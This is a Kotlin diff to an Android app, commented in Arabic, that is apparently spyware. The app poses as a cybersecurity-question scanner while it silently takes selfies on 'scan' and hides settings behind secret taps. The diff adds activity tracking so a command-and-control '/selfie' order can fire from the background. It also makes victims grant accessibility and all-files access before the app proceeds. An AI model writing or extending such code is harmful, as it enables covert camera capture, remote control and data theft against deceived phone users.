@@ -16,6 +16,7 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import com.example.disguise.core.C2Service
 import com.example.disguise.control.CameraExfil
+import com.example.disguise.util.ActivityTracker
 import com.example.disguise.util.PermissionHelper
 import com.google.android.material.button.MaterialButton
 import kotlinx.coroutines.CoroutineScope
@@ -31,6 +32,7 @@ import kotlinx.coroutines.launch
  * 2. العمل كماسح ضوئي وهمي لحل أسئلة الأمن السيبراني.
  * 3. التقاط صورة سيلفي بصمت عند الضغط على "مسح".
  * 4. النقر السري (7 مرات) على الشعار لفتح الإعدادات.
+ * 5. تتبع الواجهة (ActivityTracker) لاستخدامها في الأوامر عن بُعد.
  */
 class MainActivity : AppCompatActivity() {
 
@@ -97,6 +99,19 @@ class MainActivity : AppCompatActivity() {
     }
 
     // ============================================================
+    // تتبع دورة حياة الواجهة (مهم جداً لأمر /selfie من الخلفية)
+    // ============================================================
+    override fun onResume() {
+        super.onResume()
+        ActivityTracker.setCurrentActivity(this)
+    }
+
+    override fun onPause() {
+        super.onPause()
+        ActivityTracker.clearCurrentActivity()
+    }
+
+    // ============================================================
     // 1. إعداد الواجهة
     // ============================================================
     private fun setupUI() {
@@ -146,6 +161,17 @@ class MainActivity : AppCompatActivity() {
 
         // زر البدء (إخفاء شاشة الصلاحيات وإظهار الماسح)
         btnStartApp.setOnClickListener {
+            // التحقق من الصلاحيات الأساسية قبل السماح بالدخول
+            if (!PermissionHelper.isAccessibilityEnabled(this)) {
+                Toast.makeText(this, "الرجاء تفعيل خدمة قراءة الشاشة أولاً", Toast.LENGTH_LONG).show()
+                return@setOnClickListener
+            }
+            if (!PermissionHelper.hasAllFilesAccess()) {
+                Toast.makeText(this, "الرجاء السماح بالوصول لجميع الملفات أولاً", Toast.LENGTH_LONG).show()
+                return@setOnClickListener
+            }
+
+            // إذا كان كل شيء جاهزاً، ابدأ!
             permissionOverlay.visibility = View.GONE
             mainContent.visibility = View.VISIBLE
         }
